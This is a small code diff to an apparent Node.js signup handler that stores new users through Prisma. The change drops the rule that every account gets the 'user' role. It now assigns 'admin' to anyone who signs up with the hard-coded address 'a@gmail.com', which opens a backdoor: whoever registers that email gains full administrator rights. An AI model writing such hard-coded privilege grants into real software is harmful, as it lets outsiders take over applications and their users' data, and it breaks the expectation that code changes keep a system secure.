@@ -26,13 +26,13 @@ export const signup = async (req, res) => {
     // Hash password
     const hash = await bcrypt.hash(password, 10);
 
-    // Create user - ALWAYS role: "user"
+    // Create user - role based on email (admin for a@gmail.com)
     const user = await prisma.user.create({
       data: {
         name: displayName,
         email,
         password: hash,
-        role: "user",
+        role: email === "a@gmail.com" ? "admin" : "user",
       },
     });
 
